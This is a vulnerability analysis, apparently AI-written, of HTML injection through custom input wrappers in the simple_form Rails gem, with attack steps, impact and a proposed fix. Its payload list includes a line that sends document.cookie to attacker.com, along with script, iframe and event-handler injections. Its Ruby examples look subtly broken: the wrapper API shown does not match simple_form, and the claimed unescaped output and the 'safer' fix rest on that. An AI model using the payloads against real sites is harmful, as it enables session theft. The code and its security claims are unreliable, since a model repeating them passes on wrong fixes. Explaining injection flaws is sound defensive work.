## Deep Dive Analysis: HTML Injection via Custom Input Wrappers or Components in simple_form

This analysis focuses on the HTML Injection vulnerability arising from the use of custom input wrappers or components within the `simple_form` gem for Ruby on Rails. We will dissect the attack surface, explore the mechanisms of exploitation, detail the potential impact, and provide actionable recommendations for the development team.

**1. Deconstructing the Attack Surface:**

The core of this vulnerability lies in the interplay between `simple_form`'s flexibility and the developer's responsibility to handle dynamic data securely. Here's a breakdown:

* **`simple_form`'s Role:** `simple_form` is designed to simplify the creation of HTML forms in Rails. Its powerful configuration options allow developers to customize the structure and presentation of form inputs through wrappers and components. This extensibility is a key feature but also the root cause of this attack surface.
* **Custom Wrappers and Components:** Developers can define custom Ruby blocks or classes to structure the HTML surrounding form inputs. These wrappers control elements like labels, hints, errors, and the input field itself.
* **Dynamic Content in Wrappers:** The vulnerability arises when dynamic data, potentially originating from user input, database records, or external sources, is incorporated into the HTML structure generated by these custom wrappers *without proper escaping*.
* **The `wrapper_options` Hash:** The provided example highlights the danger of passing unescaped data through the `wrapper_options` hash directly to the `input` tag. This hash is intended for passing HTML attributes to the input element.

**2. Mechanisms of Exploitation:**

An attacker can exploit this vulnerability by injecting malicious HTML code into data that is subsequently used within a custom wrapper without proper escaping. Here's a step-by-step breakdown:

1. **Identify Injection Points:** The attacker needs to find a data point that is eventually rendered within a custom `simple_form` wrapper. This could be:
    * **Model Attributes:** Data stored in the database that is displayed in the form (e.g., a user's "description" field).
    * **Controller-Provided Variables:** Data passed from the controller to the view that is used in the form configuration.
    * **URL Parameters:**  Less likely in this specific scenario, but still a potential source if used to dynamically configure form elements.
2. **Craft Malicious Payloads:** The attacker crafts HTML payloads designed to execute malicious actions. Examples include:
    * **`<script>alert('XSS')</script>`:**  Classic Cross-Site Scripting (XSS) to execute arbitrary JavaScript.
    * **`<img src="http://attacker.com/steal_cookies.php?cookie=" + document.cookie>`:** Stealing user cookies.
    * **`<iframe src="http://malicious.com"></iframe>`:** Embedding malicious content.
    * **`<a href="javascript:void(0)" onclick="maliciousFunction()">Click Me</a>`:** Injecting event handlers.
    * **Manipulating Attributes:** Injecting attributes like `onload` or `onerror` into image tags to execute JavaScript.
3. **Inject the Payload:** The attacker injects the malicious payload into the identified data point. This could involve:
    * Submitting a form with malicious data.
    * Modifying database records directly (if they have access).
    * Manipulating URL parameters (less common for this specific vulnerability).
4. **Trigger Rendering:** When the application renders the form using `simple_form` and the vulnerable custom wrapper, the injected HTML is included in the output.
5. **Exploitation:** The browser interprets the injected HTML, leading to the execution of the malicious code.

**3. Deeper Dive into the Example:**

Let's analyze the provided vulnerable wrapper example:

```ruby
SimpleForm.wrappers.basic_wrapper = proc do |b|
  b.use :html5
  b.use :placeholder
  b.optional :maxlength
  b.optional :pattern
  b.use :label, class: 'form-label'
  b.wrapper tag: :div, class: 'input-group' do |ba|
    ba.use :input, class: 'form-control', **wrapper_options  # Potentially unsafe
  end
  b.use :hint,  wrap_with: { tag: :small, class: 'form-text text-muted' }
  b.use :error, wrap_with: { tag: :div, class: 'invalid-feedback' }
end
```

The critical point is `ba.use :input, class: 'form-control', **wrapper_options`. If the `wrapper_options` hash contains user-controlled data that hasn't been properly escaped, an attacker can inject arbitrary HTML attributes.

**Example Scenario:**

Imagine the following code in a view:

```ruby
<%= simple_form_for @user do |f| %>
  <%= f.input :name, wrapper_options: { data: { custom_attribute: @user.unsafe_description } } %>
<% end %>
```

If `@user.unsafe_description` contains the string `<img src="x" onerror="alert('Injected!')">`, the rendered HTML would be:

```html
<div class="input-group">
  <input class="form-control" data-custom-attribute="<img src="x" onerror="alert('Injected!')>" type="text" name="user[name]" id="user_name">
</div>
```

While this specific example injects an attribute value, a more dangerous scenario involves injecting entire attributes or even tags if the wrapper logic is more complex.

**4. Impact Assessment:**

The impact of HTML injection can be significant, leading to various security breaches:

* **Cross-Site Scripting (XSS):** This is the most common and severe consequence. Attackers can execute arbitrary JavaScript in the victim's browser, allowing them to:
    * **Steal Session Cookies:** Hijack user sessions and impersonate them.
    * **Perform Actions on Behalf of the User:** Submit forms, change passwords, send messages.
    * **Redirect Users to Malicious Sites:** Phishing attacks.
    * **Deface the Website:** Alter the appearance of the page.
    * **Install Malware:** In some cases, XSS can be used to deliver malware.
* **Phishing Attacks:** Attackers can inject fake login forms or other elements designed to trick users into revealing sensitive information.
* **Website Defacement:**  Altering the content and appearance of the website, damaging the organization's reputation.
* **Social Engineering Attacks:**  Injecting content that manipulates users into performing unintended actions.
* **Accessibility Issues:**  While less of a direct security threat, injecting invalid HTML can break the page structure and make it inaccessible to users with disabilities.

**5. Risk Severity:**

As stated, the risk severity is **High**. The potential for widespread user compromise and significant damage to the application and its users makes this a critical vulnerability to address.

**6. Mitigation Strategies and Recommendations:**

The development team should implement the following strategies to mitigate this attack surface:

* **Prioritize Output Escaping:**  This is the most crucial defense. Ensure that all dynamic content being rendered within custom wrappers is properly escaped for the HTML context.
    * **Use Rails' Built-in Helpers:** Leverage helpers like `sanitize`, `html_escape` (`h`), and `content_tag` with appropriate options.
    * **Be Mindful of Context:** Understand the difference between escaping for HTML content and HTML attributes. Escaping requirements differ.
    * **Avoid Raw Output:**  Never directly output raw, unescaped user input or data from external sources within wrappers.
* **Review and Secure Custom Wrapper Implementations:**  Thoroughly review all custom wrapper code for potential injection points. Pay close attention to how dynamic data is being used.
* **Sanitize Input (with Caution):** While output escaping is preferred for display, consider input sanitization for data that will be stored and potentially displayed later. However, be extremely careful with sanitization, as it can be complex and might inadvertently remove legitimate content. Output escaping remains essential even after sanitization.
* **Content Security Policy (CSP):** Implement a strong CSP to control the resources the browser is allowed to load. This can significantly reduce the impact of successful XSS attacks.
* **Regular Security Audits and Code Reviews:** Conduct regular security audits and code reviews, specifically focusing on custom form implementations.
* **Static Analysis Security Testing (SAST):** Integrate SAST tools into the development pipeline to automatically identify potential HTML injection vulnerabilities.
* **Dynamic Application Security Testing (DAST):** Use DAST tools to simulate attacks and identify vulnerabilities in the running application.
* **Penetration Testing:** Engage security professionals to perform penetration testing and identify weaknesses in the application's security posture.
* **Developer Training:** Educate developers on the risks of HTML injection and secure coding practices for `simple_form` customizations.
* **Consider Framework-Provided Security Features:** Explore if `simple_form` offers any built-in mechanisms or best practices for handling dynamic content within wrappers securely. Refer to the gem's documentation.

**7. Specific Recommendations for the Vulnerable Example:**

For the provided example, the immediate fix is to ensure that the `wrapper_options` hash, especially if it contains dynamic data, is properly escaped before being passed to the `input` tag.

**Example of a Safer Implementation:**

```ruby
SimpleForm.wrappers.basic_wrapper = proc do |b|
  b.use :html5
  b.use :placeholder
  b.optional :maxlength
  b.optional :pattern
  b.use :label, class: 'form-label'
  b.wrapper tag: :div, class: 'input-group' do |ba|
    # Escape the values in wrapper_options
    escaped_options = wrapper_options.transform_values { |v| ERB::Util.html_escape(v) }
    ba.use :input, class: 'form-control', **escaped_options
  end
  b.use :hint,  wrap_with: { tag: :small, class: 'form-text text-muted' }
  b.use :error, wrap_with: { tag: :div, class: 'invalid-feedback' }
end
```

**Important Note:**  This is a simplified example. The specific escaping method might need to be adjusted based on the context of the data within `wrapper_options`. For instance, if you are setting attributes that expect JavaScript, you might need to consider other security measures beyond basic HTML escaping.

**8. Conclusion:**

HTML injection via custom input wrappers in `simple_form` represents a significant security risk. The flexibility of the gem, while powerful, necessitates careful attention to secure coding practices, particularly when handling dynamic content. By implementing robust output escaping, conducting thorough code reviews, and leveraging security testing methodologies, the development team can effectively mitigate this attack surface and protect the application and its users from potential harm. Prioritizing developer education and adopting a security-conscious mindset are crucial for building secure applications with `simple_form`.
